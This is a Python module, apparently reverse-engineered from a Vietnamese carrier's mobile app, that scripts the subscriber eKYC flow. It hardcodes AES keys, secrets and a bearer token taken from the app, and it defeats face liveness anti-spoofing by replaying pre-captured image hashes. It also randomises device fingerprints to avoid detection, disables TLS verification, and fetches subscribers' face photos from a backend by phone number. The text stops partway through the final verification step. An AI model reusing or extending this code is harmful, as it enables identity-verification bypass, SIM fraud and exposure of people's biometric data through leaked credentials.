"""
ekyc_service.py — ĐKTTTB eKYC Service Module
=============================================
Trích xuất và refactor toàn bộ logic từ ekyc_full.py
cho phép tích hợp vào Flask web app.

Hỗ trợ:
  - Face-only flow (bypass liveness với pre-captured hash)
  - Upload CCCD mặt trước / mặt sau
  - NFC scan data
  - Ký điện tử (digital signature)
  - Tự động tải ảnh mặt từ ONEBSS khi không có ảnh upload
"""

import base64, hashlib, json, uuid, os, re, secrets, string, ssl, time, threading
import requests, urllib3
from collections import OrderedDict

# ─── pycryptodome ───────────────────────────────────────────────────────────
from Crypto.Cipher import AES, PKCS1_v1_5
from Crypto.Util.Padding import unpad, pad
from Crypto.PublicKey import RSA
from Crypto.Signature import pkcs1_15
from Crypto.Hash import SHA256
from requests.adapters import HTTPAdapter
from urllib3.util.ssl_ import create_urllib3_context

urllib3.disable_warnings()

# ===========================================================================
# CONSTANTS (hardcoded từ APK — confirmed via Frida + HTTP Toolkit)
# ===========================================================================
AES_MASTER_KEY = "dqeqgig123ndb123dsfsdf23g4d56jfq"   # getKeyEncryptAES()
SECRET_AUTHEN  = "05ca696sdg4533250c49bdf16a76ad247"   # getSecretAuthenKeySimOnline()
AI_TOKEN       = "8928skjhfa89298jahga1771vbvb"         # Constants.AI_TOKEN

MYVNPT_BASE    = "https://api-myvnpt.vnpt.vn"
IDG_BASE       = "https://api.idg.vnpt.vn"
ONEBSS_BASE    = "https://api-onebss.vnpt.vn"
IV_ZEROS       = bytes(16)

# Bearer token cứng (từ APK)
_BEARER_TOKEN  = "Bearer a60bd62fed0cf1076e93af76114f196bd9c5a48155b2bac88afe15c49595414b"

# initDevice server public key (initial, trước khi nhận serverPublicKey)
_INIT_SPK = (
    "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqEZrm+72VDaEzV4PAzYlt"
    "gnWQnhlYYjD/i1ABMB2UKU9wVNrKDXPwLoI1+yE2AnkbqZeBy1dXSNuxvhC030nN"
    "78kav8cX3QE2JsQf6Z/dadZcGCOL41x4AVcynDt+70QGtur5tHU4D56MQltnCpX6D"
    "mDlE2foe9XUQcd5XyHc2x8dnm9OZLCUhjK2xWTPRk80Uu/aU6rb1QtCB59/YWXsyf"
    "eaLHuvuKBPeMUSPlIDRj5zN6UCPZMsDUZxdSzQIaisS3I1oKGOMaAeAgMcISFUM/8r"
    "yH8yzvUAy0ANYjbyW8dj63WHHyXZcXkoLyMAmuze30oHjtE61iVmTiciYpYYQIDAQAB"
)

# Pre-captured liveness hashes (bypass anti-spoofing — July 8, score 0.9)
NEAR_HASH_DEFAULT = "zone4/idg20260708-0ced7972-9864-4a32-e063-62199f0ad57f/IDG01_a4fd5ce0-7a86-11f1-8182-fd7dbf4502cd"
FAR_HASH_DEFAULT  = "zone2/idg20260708-0ced7972-9864-4a32-e063-62199f0ad57f/IDG01_a51662cf-7a86-11f1-af90-5fbeee1966b6"


# ===========================================================================
# SSL ADAPTER (cho api-myvnpt.vnpt.vn — TLS cipher compat)
# ===========================================================================
class DhAdapter(HTTPAdapter):
    def init_poolmanager(self, *args, **kwargs):
        ctx = create_urllib3_context()
        ctx.set_ciphers("DEFAULT:@SECLEVEL=1")
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        kwargs["ssl_context"] = ctx
        return super().init_poolmanager(*args, **kwargs)


# ===========================================================================
# CRYPTO HELPERS
# ===========================================================================
def _aes_encrypt(plaintext: str, key: str) -> str:
    """AES/CBC/PKCS7 encrypt"""
    cipher = AES.new(key.encode("utf-8"), AES.MODE_CBC, IV_ZEROS)
    return base64.b64encode(
        cipher.encrypt(pad(plaintext.encode("utf-8"), AES.block_size))
    ).decode("utf-8")


def _aes_decrypt(b64_data: str, key: str) -> str:
    """AES/CBC/PKCS7 decrypt"""
    raw = base64.b64decode(b64_data)
    cipher = AES.new(key.encode("utf-8"), AES.MODE_CBC, IV_ZEROS)
    return unpad(cipher.decrypt(raw), AES.block_size).decode("utf-8")


def _sign_sha256_rsa(data_str: str, priv_key_b64: str) -> str:
    """SHA256withRSA PKCS1v15 signature"""
    key = RSA.import_key(base64.b64decode(priv_key_b64))
    h   = SHA256.new(data_str.encode("utf-8"))
    return base64.b64encode(pkcs1_15.new(key).sign(h)).decode("utf-8")


def _rsa_encrypt_no_padding(plaintext: str, pub_key_b64: str) -> str:
    """RSA/ECB/NoPadding — zero-pad left to modulus length"""
    key = RSA.import_key(base64.b64decode(pub_key_b64))
    n, e = key.n, key.e
    key_size = (n.bit_length() + 7) // 8
    pt_bytes = plaintext.encode("utf-8")
    pt_padded = b"\x00" * (key_size - len(pt_bytes)) + pt_bytes
    m = int.from_bytes(pt_padded, "big")
    c = pow(m, e, n)
    return base64.b64encode(c.to_bytes(key_size, "big")).decode("utf-8").replace("\n", "").replace("\r", "")


def _random_device_profile() -> dict:
    """Sinh profile thiết bị ngẫu nhiên (tránh fingerprint)"""
    import random
    _MODELS = [
        ("V2057", "11"), ("CPH2179", "11"), ("V2206", "12"),
        ("SM-A037F", "12"), ("M2103K19G", "11"), ("RMX3430", "12"),
        ("SM-A135F", "12"), ("CPH2269", "12"), ("SM-A225F", "11"),
        ("RMX3195", "11"), ("SM-A536B", "13"), ("V2218", "12"),
        ("CPH2325", "12"), ("M2012K11AG", "12"),
    ]
    model, android_ver = random.choice(_MODELS)
    dev_uuid  = str(uuid.uuid4())
    fcm_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_:"
    fcm_token = "".join(random.choices(fcm_chars, k=168))
    mac       = "".join(random.choices("0123456789abcdef", k=16))
    di        = f"{dev_uuid}|{dev_uuid}|unknown|Android||3.3.99.Prd|{model}|{android_ver}|"
    return {
        "uuid": dev_uuid, "model": model, "android_ver": android_ver,
        "fcm_token": fcm_token, "mac": mac, "di": di,
    }


def _normalize_phone(phone: str) -> tuple[str, str]:
    """Trả về (msisdn_84, phone_0xx)"""
    p = phone.strip()
    if p.startswith("84") and len(p) > 10:
        digits = p[2:]
    elif p.startswith("+84"):
        digits = p[3:]
    elif p.startswith("0"):
        digits = p[1:]
    else:
        digits = p
    return "84" + digits, "0" + digits


# ===========================================================================
# ONEBSS: Tải ảnh khuôn mặt từ ONEBSS khi không có ảnh upload
# ===========================================================================
def fetch_face_from_onebss(phone_fmt: str, onebss_token: str, device_id: str = "0f8c2d3fb0c51653", img_type: str = "3") -> bytes | None:
    """Tải ảnh khuôn mặt từ ONEBSS tracuu_anh_thuebao. Trả về bytes hoặc None."""
    _di = {
        "device_id": device_id, "device_ip": "Unknown", "device_name": "Web-Browser",
        "mac_address": "Unknown", "mobile_id": "web-generated-id",
        "app_id": "1", "app_version": "1.5.41.007", "os_version": "Android"
    }
    app_secret = base64.b64encode(json.dumps(_di, separators=(",", ":")).encode()).decode()
    hdrs = {
        "Content-Type": "application/json", "Accept": "application/json",
        "app-secret": app_secret,
        "authorization": f"Bearer {onebss_token}",
        "selectedmenuid": "810241"
    }
    target_types = [x.strip() for x in str(img_type).split(",") if x.strip()]
    if "3" in target_types:
        target_types += ["face", "FACE"]

    for attempt in range(3):
        try:
            r = requests.post(
                f"{ONEBSS_BASE}/app-banhang/ccbs/tracuu_anh_thuebao",
                headers=hdrs,
                json={"p_somay": phone_fmt, "menu_id": 810241},
                timeout=60, verify=False
            )
            if r.status_code != 200:
                continue
            images = r.json().get("data") or []
            if not isinstance(images, list) or not images:
                continue

            best = next((img for img in images if isinstance(img, dict) and str(img.get("type", "")) in target_types), None)
            if not best:
                best = images[-1] if isinstance(images[-1], dict) else None
            if not best:
                continue

            b64_data = best.get("image_base") or best.get("base64") or ""
            img_url  = best.get("url") or best.get("image_url") or ""

            if b64_data and len(b64_data) > 500:
                raw = base64.b64decode(b64_data)
                if len(raw) > 2048:
                    return raw
            if img_url:
                if img_url.startswith("//"): img_url = "https:" + img_url
                elif img_url.startswith("/"): img_url = ONEBSS_BASE + img_url
                r2 = requests.get(img_url, headers=hdrs, timeout=60, verify=False)
                if len(r2.content) > 2048:
                    return r2.content
        except Exception:
            pass
        if attempt < 2:
            time.sleep(3)
    return None


# ===========================================================================
# MAIN eKYC FLOW
# ===========================================================================
class EkycRunner:
    """
    Chạy toàn bộ luồng ĐKTTTB cho 1 số điện thoại.
    
    Sử dụng:
        runner = EkycRunner(phone, password, otp=None, log_cb=print)
        result = runner.run(face_bytes=None, cccd_front_bytes=None,
                            cccd_back_bytes=None, nfc_data=None,
                            onebss_token='', digital_signature=None)
    """

    def __init__(self, phone: str, password: str = "", otp: str = "", log_cb=None):
        self.phone    = phone
        self.password = password
        self.otp      = otp
        self.log      = log_cb or (lambda m: None)
        self.msisdn_84, self.phone_fmt = _normalize_phone(phone)
        self.prof     = _random_device_profile()

        # Session state (populated during run)
        self._session   = requests.Session()
        self._session.mount("https://", DhAdapter())
        self.rsa_priv_b64  = ""
        self.server_pub_b64= ""
        self.login_session = ""
        self.aes_key       = ""
        self.bearer_token  = _BEARER_TOKEN
        self.device_info   = self.prof["di"]
        self.mac_address   = self.prof["mac"]
        self.client_session= ""

        # eKYC tokens
        self.token_id  = ""
        self.token_key = ""
        self.access_token = ""
        self.challenge_code = ""
        self.ekyc_request_log_id = 0

    # ── Helpers ────────────────────────────────────────────────────────────
    def _myvnpt_headers(self, x_sig: str = "", x_secret: str = "") -> dict:
        h = {
            "Authorization": self.bearer_token,
            "Content-Type":  "application/json; charset=UTF-8",
            "Cache-Control": "no-cache",
            "Channel-Code":  "APP",
            "Device-Info":   self.device_info,
            "Language":      "vi_VN",
            "partnerCode":   "MYVNPT",
            "User-Agent":    "okhttp/4.7.2",
        }
        if x_sig:    h["X-Signature"]  = x_sig
        if x_secret: h["X-Secret-Key"] = x_secret
        return h

    def _idg_headers(self, json_body: bool = False) -> dict:
        h = {
            "Token-id":    self.token_id,
            "Token-key":   self.token_key,
            "mac-address": self.mac_address,
        }
        if self.access_token:
            h["Authorization"] = f"bearer {self.access_token}"
        if json_body:
            h["Content-Type"] = "application/json"
        return h

    def _build_signed_request(self, body_dict: dict) -> tuple[str, str, str]:
        """AES-encrypt + RSA-sign body. Returns (encrypted_data, x_sig, x_secret)."""
        body_json = json.dumps(body_dict, separators=(",", ":"))
        encrypted = _aes_encrypt(body_json, self.aes_key)
        x_sig     = _sign_sha256_rsa(encrypted, self.rsa_priv_b64)
        x_secret  = _rsa_encrypt_no_padding(self.aes_key, self.server_pub_b64)
        return encrypted, x_sig, x_secret

    def _post_signed(self, url: str, body_dict: dict, timeout: int = 90) -> dict:
        """POST với AES+RSA signing — trả về parsed JSON."""
        encrypted, x_sig, x_secret = self._build_signed_request(body_dict)
        hdrs = self._myvnpt_headers(x_sig, x_secret)
        resp = self._session.post(url, headers=hdrs,
                                  json={"requestData": encrypted},
                                  timeout=timeout, verify=False)
        return resp.json()

    # ── STEP 1: initDevice ──────────────────────────────────────────────────
    def step_init_device(self) -> bool:
        self.log("[1/9] initDevice — đăng ký RSA key...")
        key       = RSA.generate(2048)
        priv_der  = key.export_key("DER", pkcs=8)
        priv_b64  = base64.b64encode(priv_der).decode().replace("\n", "").replace("\r", "")
        pub_b64   = base64.b64encode(key.publickey().export_key("DER")).decode().replace("\n", "").replace("\r", "")

        req_json  = json.dumps({"clientPublicKey": pub_b64, "osName": self.prof["android_ver"], "deviceName": self.prof["model"]}, separators=(",", ":"))
        rd        = _aes_encrypt(req_json, AES_MASTER_KEY)
        h         = SHA256.new(rd.encode("utf-8"))
        sig       = base64.b64encode(pkcs1_15.new(key).sign(h)).decode().replace("\n", "")

        spk_obj   = RSA.import_key(base64.b64decode(_INIT_SPK))
        ksz       = (spk_obj.n.bit_length() + 7) // 8
        pt        = AES_MASTER_KEY.encode("utf-8")
        c_        = pow(int.from_bytes(b"\x00" * (ksz - len(pt)) + pt, "big"), spk_obj.e, spk_obj.n)
        xsec      = base64.b64encode(c_.to_bytes(ksz, "big")).decode().replace("\n", "")

        resp = self._session.post(
            f"{MYVNPT_BASE}/tel_service/device/initDevice",
            headers={**self._myvnpt_headers(), "X-Secret-Key": xsec, "X-Signature": sig},
            json={"requestData": rd}, timeout=60, verify=False
        )
        d = resp.json()
        id_data = d.get("data", "")
        if not id_data:
            self.log(f"[1/9] ❌ initDevice FAILED: {d.get('message')} ec={d.get('errorCode')}")
            return False

        new_spk = json.loads(_aes_decrypt(id_data, AES_MASTER_KEY)).get("serverPublicKey", "")
        if not new_spk:
            self.log("[1/9] ❌ Không có serverPublicKey!")
            return False

        self.rsa_priv_b64   = priv_b64
        self.server_pub_b64 = new_spk
        self.log("[1/9] ✅ initDevice OK")
        return True

    # ── STEP 2: authen_msisdn ───────────────────────────────────────────────
    def step_authen(self) -> bool:
        self.log(f"[2/9] authen_msisdn — đăng nhập {self.msisdn_84}...")
        base_headers = {
            "Authorization": self.bearer_token,
            "Content-Type":  "application/json; charset=UTF-8",
            "Device-Info":   self.device_info,
            "Language":      "vi_VN",
            "User-Agent":    "okhttp/4.7.2",
        }
        if self.otp:
            body = {"device_info": self.prof["model"], "fcm_registration_token": self.prof["fcm_token"],
                    "mode": "otp", "msisdn": self.msisdn_84, "otp": self.otp}
        else:
            pw_md5 = hashlib.md5(self.password.encode("utf-8")).hexdigest().upper()
            body = {"device_info": self.prof["model"], "fcm_registration_token": self.prof["fcm_token"],
                    "mode": "password", "msisdn": self.msisdn_84, "password": pw_md5}

        resp = self._session.post(f"{MYVNPT_BASE}/mapi_v2/services/authen_msisdn",
                                   headers=base_headers, json=body, timeout=60, verify=False)
        d  = resp.json()
        ec = str(d.get("error_code", "?"))
        sv = d.get("session", "")
        if ec != "0" or not sv:
            self.log(f"[2/9] ❌ Login FAILED: ec={ec} | {d.get('message')}")
            return False

        self.login_session = sv
        ts = int(time.time() * 1000)
        model = self.prof["model"]
        self.client_session = f"ANDROID_{model}_32_Device_3.6.6_{self.mac_address}_{ts}_com.vnp.myvinaphone"
        # Generate AES session key
        self.aes_key = "".join(secrets.choice(string.ascii_letters + string.digits) for _ in range(32))
        self.log("[2/9] ✅ Login OK")
        return True

    # ── STEP 2.5: checkImeiChange ───────────────────────────────────────────
    def step_check_imei(self) -> tuple[bool, bool, dict]:
        """Trả về (success, already_done, result_data)"""
        self.log("[3/9] checkImeiChange — tạo ĐKTTTB session...")
        req_id = str(uuid.uuid4())
        secure = hashlib.sha256(f"{self.msisdn_84}|{self.msisdn_84}|{SECRET_AUTHEN}".encode()).hexdigest()

        body = OrderedDict([
            ("msisdn",           self.msisdn_84),
            ("msisdnChangeImei", self.msisdn_84),
            ("requestId",        req_id),
            ("secureCode",       secure),
            ("session",          self.login_session),
        ])
        try:
            rj = self._post_signed(f"{MYVNPT_BASE}/tel_service/imei/checkImeiChange", body)
        except Exception as ex:
            self.log(f"[3/9] ❌ checkImeiChange error: {ex}")
            return False, False, {}

        enc = rj.get("data", "")
        obj = {}
        if enc:
            try:
                obj = json.loads(_aes_decrypt(enc, self.aes_key))
            except Exception:
                pass

        ec = obj.get("errorCode", "")
        if ec in ("1312", "1303"):
            self.log(f"[3/9] ✅ ĐÃ HOÀN THÀNH TRƯỚC ĐÓ (ec={ec})")
            return True, True, obj.get("result", {}) or obj
        self.log(f"[3/9] ✅ checkImeiChange OK, tiếp tục eKYC...")
        return True, False, {}

    # ── STEP 3: getChallengeCodeSdkEkyc ────────────────────────────────────
    def step_get_challenge(self) -> bool:
        self.log("[4/9] getChallengeCodeSdkEkyc...")
        req_id = str(uuid.uuid4())
        secure = hashlib.sha256(f"{self.msisdn_84}|{req_id}|{SECRET_AUTHEN}".encode()).hexdigest()

        body = OrderedDict([
            ("feature",   "UPDATE_INFO"),
            ("msisdn",    self.msisdn_84),
            ("requestId", req_id),
            ("secureCode",secure),
            ("session",   self.login_session),
        ])
        try:
            rj = self._post_signed(f"{MYVNPT_BASE}/tel_service/active_sim/v2/getChallengeCodeSdkEkyc", body)
        except Exception as ex:
            self.log(f"[4/9] ❌ getChallengeCode error: {ex}")
            return False

        ec = rj.get("errorCode")
        if ec and ec not in ("0", "00"):
            self.log(f"[4/9] ❌ FAILED: ec={ec} | {rj.get('message')}")
            return False

        enc = rj.get("data", "")
        if not enc:
            self.log("[4/9] ❌ Không có data trong response")
            return False

        try:
            result = json.loads(_aes_decrypt(enc, self.aes_key))
        except Exception as ex:
            self.log(f"[4/9] ❌ Decrypt error: {ex}")
            return False

        self.challenge_code = result.get("challengeCode", "")
        ekyc_token_raw      = result.get("ekycToken") or result.get("nfcToken") or {}

        try:
            self.access_token = _aes_decrypt(ekyc_token_raw.get("access_token", ""), AES_MASTER_KEY) if ekyc_token_raw.get("access_token") else ""
            self.token_id     = _aes_decrypt(ekyc_token_raw.get("token_id", ""), AES_MASTER_KEY)
            self.token_key    = _aes_decrypt(ekyc_token_raw.get("token_tokenkey", ""), AES_MASTER_KEY)
        except Exception as ex:
            self.log(f"[4/9] ❌ Decrypt ekycToken error: {ex}")
            return False

        self.log(f"[4/9] ✅ challengeCode: {self.challenge_code[:40]}...")
        return True

    # ── STEP 4: Upload image to IDG ─────────────────────────────────────────
    def _upload_file_to_idg(self, img_bytes: bytes, filename: str, title: str = "image", desc: str = "image") -> str:
        """Upload ảnh lên IDG, trả về hash/path."""
        ext = os.path.splitext(filename)[1].lower()
        ct  = "image/png" if ext == ".png" else "image/jpeg"
        try:
            r = requests.post(
                f"{IDG_BASE}/file-service/v1/addFile",
                headers=self._idg_headers(),
                files={"file": (filename, img_bytes, ct)},
                data={"title": title, "description": desc},
                timeout=60, verify=False
            )
            rj  = r.json()
            obj = rj.get("object", {})
            h   = (obj.get("hash") or obj.get("path") or
                   rj.get("hash") or rj.get("path") or "")
            return h
        except Exception as ex:
            self.log(f"    Upload {filename} ERROR: {ex}")
            return ""

    # ── STEP 5: Face mask detection ─────────────────────────────────────────
    def step_face_mask(self, face_bytes: bytes | None, face_hash: str = "") -> tuple[str, str]:
        """Upload ảnh mặt + gọi mask detection. Trả về (dataBase64, dataSign)."""
        self.log("[5/9] Face mask detection...")

        if face_hash:
            mask_hash = face_hash
        elif face_bytes:
            mask_hash = self._upload_file_to_idg(face_bytes, "face.jpg", "face mask", "face mask scan")
            if not mask_hash:
                self.log("    ⚠️ Upload mặt thất bại, dùng pre-captured hash")
                mask_hash = FAR_HASH_DEFAULT
        else:
            self.log("    ⚠️ Không có ảnh mặt, dùng pre-captured hash")
            mask_hash = FAR_HASH_DEFAULT

        mask_url  = f"{IDG_BASE}/ai/v1/face/mask?challenge_code={self.challenge_code}"
        mask_body = {
            "face_bbox":      None,
            "face_lmark":     None,
            "img":            mask_hash,
            "client_session": self.client_session,
            "token":          AI_TOKEN,
            "step_id":        0,
        }
        try:
            r = requests.post(mask_url, headers=self._idg_headers(True), json=mask_body, timeout=60, verify=False)
            rj = r.json()
            data_b64  = rj.get("dataBase64", "")
            data_sign = rj.get("dataSign", "")
            self.log(f"[5/9] {'✅ Mask OK' if data_sign else '⚠️ Mask no sign'}")
            return data_b64, data_sign
        except Exception as ex:
            self.log(f"[5/9] ❌ Face mask error: {ex}")
            return "", ""

    # ── STEP 6: Liveness 3D ─────────────────────────────────────────────────
    def step_liveness_3d(self) -> tuple[str, str, str]:
        """Gọi liveness-3d với pre-captured bypass hashes. Trả về (dataBase64, dataSign, fullText)."""
        self.log("[6/9] Liveness 3D (bypass pre-captured hash July 8)...")
        live_url  = f"{IDG_BASE}/ai/v1/face/liveness-3d?challenge_code={self.challenge_code}"
        live_body = {
            "far_img":        FAR_HASH_DEFAULT,
            "near_img":       NEAR_HASH_DEFAULT,
            "scan3d":         FAR_HASH_DEFAULT,
            "client_session": self.client_session,
            "token":          AI_TOKEN,
            "step_id":        0,
        }
        try:
            r = requests.post(live_url, headers=self._idg_headers(True), json=live_body, timeout=60, verify=False)
            full_text  = r.text
            rj         = r.json()
            data_b64   = rj.get("dataBase64", "")
            data_sign  = rj.get("dataSign", "")
            self.log(f"[6/9] {'✅ Liveness OK' if data_sign else '⚠️ Liveness no sign'}")
            return data_b64, data_sign, full_text
        except Exception as ex:
            self.log(f"[6/9] ❌ Liveness error: {ex}")
            return "", "", ""

    # ── STEP 7: Upload CCCD (front/back) + OCR (tùy chọn) ─────────────────
    def step_upload_cccd(
        self,
        cccd_front_bytes: bytes | None,
        cccd_back_bytes:  bytes | None,
        nfc_data:         dict | None = None,
        digital_sig:      bytes | None = None,
    ) -> dict:
        """
        Upload CCCD mặt trước/sau lên IDG và gọi OCR.
        Trả về dict chứa hashes và OCR data để dùng trong saveLogEkyc.
        nfc_data: dict từ NFC chip (tùy chọn, bổ sung OCR)
        digital_sig: bytes chữ ký điện tử (tùy chọn)
        """
        result = {
            "front_hash": "", "back_hash": "",
            "data_ekyc": "", "sign_ekyc": "",        # OCR back
            "data_ekyc_front": "", "sign_ekyc_front": "",  # OCR front
            "live_card_front": "", "live_card_front_sign": "",
            "live_card_back":  "", "live_card_back_sign":  "",
            "nfc_data": nfc_data or {},
            "digital_sig": base64.b64encode(digital_sig).decode() if digital_sig else "",
        }

        if cccd_front_bytes:
            self.log("[7/9] Upload CCCD mặt trước...")
            front_hash = self._upload_file_to_idg(cccd_front_bytes, "cccd_front.jpg", "ocr front", "ocr front old type")
            result["front_hash"] = front_hash
            if front_hash:
                self.log(f"    ✅ CCCD mặt trước hash: {front_hash[:60]}...")
                # OCR front card
                try:
                    ocr_url = f"{IDG_BASE}/ai/v1/id-card/ocr?challenge_code={self.challenge_code}"
                    ocr_body = {
                        "img": front_hash,
                        "client_session": self.client_session,
                        "token": AI_TOKEN,
                        "step_id": 0,
                    }
                    r = requests.post(ocr_url, headers=self._idg_headers(True), json=ocr_body, timeout=60, verify=False)
                    rj = r.json()
                    result["data_ekyc_front"] = rj.get("dataBase64", "")
                    result["sign_ekyc_front"] = rj.get("dataSign", "")
                    self.log(f"    OCR front: {'OK' if result['sign_ekyc_front'] else 'Không có sign'}")
                except Exception as ex:
                    self.log(f"    OCR front error: {ex}")

                # Liveness card front
                try:
                    lv_url = f"{IDG_BASE}/ai/v1/id-card/liveness?challenge_code={self.challenge_code}"
                    lv_body = {"img": front_hash, "client_session": self.client_session, "token": AI_TOKEN, "step_id": 1}
                    r2 = requests.post(lv_url, headers=self._idg_headers(True), json=lv_body, timeout=60, verify=False)
                    rj2 = r2.json()
                    result["live_card_front"] = rj2.get("dataBase64", "")
                    result["live_card_front_sign"] = rj2.get("dataSign", "")
                    self.log(f"    Liveness CCCD trước: {'OK' if result['live_card_front_sign'] else 'Không có sign'}")
                except Exception as ex:
                    self.log(f"    Liveness CCCD trước error: {ex}")

        if cccd_back_bytes:
            self.log("[7/9] Upload CCCD mặt sau...")
            back_hash = self._upload_file_to_idg(cccd_back_bytes, "cccd_back.jpg", "ocr back", "ocr back old type")
            result["back_hash"] = back_hash
            if back_hash:
                self.log(f"    ✅ CCCD mặt sau hash: {back_hash[:60]}...")
                # OCR back card
                try:
                    ocr_url = f"{IDG_BASE}/ai/v1/id-card/ocr?challenge_code={self.challenge_code}"
                    ocr_body = {
                        "img": back_hash,
                        "client_session": self.client_session,
                        "token": AI_TOKEN,
                        "step_id": 2,
                    }
                    r = requests.post(ocr_url, headers=self._idg_headers(True), json=ocr_body, timeout=60, verify=False)
                    rj = r.json()
                    result["data_ekyc"] = rj.get("dataBase64", "")
                    result["sign_ekyc"] = rj.get("dataSign", "")
                    self.log(f"    OCR back: {'OK' if result['sign_ekyc'] else 'Không có sign'}")
                except Exception as ex:
                    self.log(f"    OCR back error: {ex}")

                # Liveness card back
                try:
                    lv_url = f"{IDG_BASE}/ai/v1/id-card/liveness?challenge_code={self.challenge_code}"
                    lv_body = {"img": back_hash, "client_session": self.client_session, "token": AI_TOKEN, "step_id": 3}
                    r2 = requests.post(lv_url, headers=self._idg_headers(True), json=lv_body, timeout=60, verify=False)
                    rj2 = r2.json()
                    result["live_card_back"] = rj2.get("dataBase64", "")
                    result["live_card_back_sign"] = rj2.get("dataSign", "")
                    self.log(f"    Liveness CCCD sau: {'OK' if result['live_card_back_sign'] else 'Không có sign'}")
                except Exception as ex:
                    self.log(f"    Liveness CCCD sau error: {ex}")

        return result

    # ── STEP 8: saveLogEkyc ─────────────────────────────────────────────────
    def step_save_log(
        self,
        live_face_b64: str, live_face_sign: str,
        mask_b64: str, mask_sign: str,
        cccd: dict | None = None,
    ) -> tuple[int, dict | None]:
        """Gọi saveLogEkyc. Trả về (ekycRequestLogId, response)."""
        self.log("[8/9] saveLogEkyc...")
        cccd = cccd or {}
        request_id = str(uuid.uuid4())
        log_id     = f"{self.token_id}-Zuulserver"

        # secureCode (xem UIV2EkycSaveLogViewModel nguồn)
        fields = [
            self.msisdn_84, self.login_session, request_id,
            log_id, "FACE", self.challenge_code,
            str(self.ekyc_request_log_id),
            cccd.get("data_ekyc", ""),
            cccd.get("sign_ekyc", ""),
            cccd.get("live_card_front", ""),
            cccd.get("live_card_front_sign", ""),
            log_id if cccd.get("live_card_front_sign") else "",
            cccd.get("live_card_back", ""),
            cccd.get("live_card_back_sign", ""),
            log_id if cccd.get("live_card_back_sign") else "",
            "", "", "",    # compareFace fields (empty)
            live_face_b64, live_face_sign,
            log_id if live_face_sign else "",
            mask_b64, mask_sign,
            log_id if mask_sign else "",
            cccd.get("data_ekyc_front", ""),
            cccd.get("sign_ekyc_front", ""),
            log_id if cccd.get("sign_ekyc_front") else "",
            SECRET_AUTHEN,
        ]
        secure_code = hashlib.sha256("|".join(fields).encode()).hexdigest()

        req = {
            "msisdn":                  self.msisdn_84,
            "session":                 self.login_session,
            "requestId":               request_id,
            "step":                    "FACE",
            "challengeCode":           self.challenge_code,
            "ekycRequestLogId":        self.ekyc_request_log_id,
            "secureCode":              secure_code,
            # OCR data
            "dataEKYC":                cccd.get("data_ekyc", ""),
            "signEKYC":                cccd.get("sign_ekyc", ""),
            "logId":                   log_id,
            "dataEKYCFront":           cccd.get("data_ekyc_front", ""),
            "signEKYCFront":           cccd.get("sign_ekyc_front", ""),
            "logIdEKYCFront":          log_id if cccd.get("sign_ekyc_front") else "",
            # Card liveness
            "liveNessCardFront":       cccd.get("live_card_front", ""),
            "liveNessCardFrontSign":   cccd.get("live_card_front_sign", ""),
            "livenessCardFrontLogId":  log_id if cccd.get("live_card_front_sign") else "",
            "liveNessCardBack":        cccd.get("live_card_back", ""),
            "liveNessCardBackSign":    cccd.get("live_card_back_sign", ""),
            "liveNessCardBackLogId":   log_id if cccd.get("live_card_back_sign") else "",
            # Face compare (không dùng)
            "KHUONMAT": "", "compareFaceSign": "", "compareFaceLogId": "",
            # Face liveness
            "liveNessFace":            live_face_b64,
            "liveNessFaceSign":        live_face_sign,
            "liveNessFaceLogId":       log_id if live_face_sign else "",
            # Masked face
            "maskedFace":              mask_b64,
            "maskedFaceSign":          mask_sign,
            "maskedFaceLogId":         log_id if mask_sign else "",
            "typeLog":                 0,
        }

        req_json  = json.dumps(req, separators=(",", ":"))
        encrypted = _aes_encrypt(req_json, self.aes_key)
        x_sig     = _sign_sha256_rsa(encrypted, self.rsa_priv_b64)
        x_secret  = _rsa_encrypt_no_padding(self.aes_key, self.server_pub_b64)

        try:
            r = self._session.post(
                f"{MYVNPT_BASE}/tel_service/update_info/saveLogEkyc",
                headers=self._myvnpt_headers(x_sig, x_secret),
                json={"requestData": encrypted},
                timeout=60, verify=False
            )
            rj = r.json()
            enc = rj.get("data", "")
            if enc:
                resp = json.loads(_aes_decrypt(enc, self.aes_key))
                ec   = resp.get("errorCode", "")
                elog_id = (resp.get("result") or {}).get("ekycRequestLogId", 0)
                self.log(f"[8/9] saveLogEkyc ec={ec}, logId={elog_id}")
                if ec in ("00", "0", ""):
                    self.ekyc_request_log_id = elog_id or self.ekyc_request_log_id
                    return elog_id, resp
                return 0, resp
        except Exception as ex:
            self.log(f"[8/9] ❌ saveLogEkyc error: {ex}")
        return 0, None

    # ── STEP 9: verifyImeiChange ─────────────────────────────────────────────
    def step_verify(
        self,
        live_face_b64: str, live_face_sign: str,
        mask_b64: str = "", mask_sign: str = "",
        cccd: dict | None = None,
        face_bytes: bytes | None = None,
    ) -> tuple[bool, dict]:
        """Gọi verifyImeiChange. Trả về (success, result_data)."""
        self.log("[9/9] verifyImeiChange — hoàn tất ĐKTTTB...")
        cccd = cccd or {}
        verify_req_id = str(uuid.uuid4())

        live_face_log_id   = ""
        masked_face_log_id = ""

        # secureCode từ TelecomSubscriberInfoViewModel.java
        verify_secure = hashlib.sha256(
            f"{self.msisdn_84}|{self.msisdn_84}|{self.client_session}|{self.challenge_code}||||"
            f"|{live_face_log_id}|{masked_face_log_id}|{SECRET_AUTHEN}".encode()
        ).hexdigest()

        verify_request = {
            "msisdn":                self.msisdn_84,
            "msisdnChangeImei":      self.msisdn_84,
            "session":               self.login_session,
            "requestId":             verify_req_id,
            "challengeCode":         self.challenge_code,
            "clientSession":         self.client_session,
            "secureCode":            verify_secure,
            "dataEKYC":              cccd.get("data_ekyc", ""),
            "signEKYC":              cccd.get("sign_ekyc", ""),
            "logIdEKYC":             "",
            "liveNessCardFront":     cccd.get("live_card_front", ""),
            "liveNessCardFrontSign": cccd.get("live_card_front_sign", ""),
            "livenessCardFrontLogId": "",
            "liveNessCardBack":      cccd.get("live_card_back", ""),
            "liveNessCardBackSign":  cccd.get("live_card_back_sign", ""),
            "liveNessCardBackLogId": "",
            "compareFace":           "",
            "compareFaceSign":       "",
            "compareFaceLogId":      "",
            "liveNessFace":          live_face_b64,
            "liveNessFaceSign":      live_face_sign,
            "liveNessFaceLogId":     live_face_log_id,
            "maskedFace":            mask_b64 or "",
            "maskedFaceSign":        mask_sign or "",
            "maskedFaceLogId":       masked_face_log_id,
        }

        # NFC data → thêm vào request nếu có
